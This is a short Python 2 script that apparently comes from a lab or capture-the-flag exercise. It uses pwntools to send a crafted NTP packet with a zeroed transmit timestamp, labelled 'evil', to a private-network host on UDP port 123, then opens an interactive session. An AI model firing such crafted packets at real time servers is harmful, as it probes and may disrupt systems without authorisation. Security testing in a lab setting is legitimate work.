#python2

from pwn import *
from ntplib import NTPPacket
import abc

abstract = abc.ABCMeta(str('ABC'), (), {})

io = pwnlib.tubes.remote.remote("192.168.20.13", 123, typ='udp')
evil = NTPPacket(tx_timestamp = 0 )
evil_str = evil.to_data()
print("evil: "+evil_str)
io.sendline(evil_str)
io.interactive()
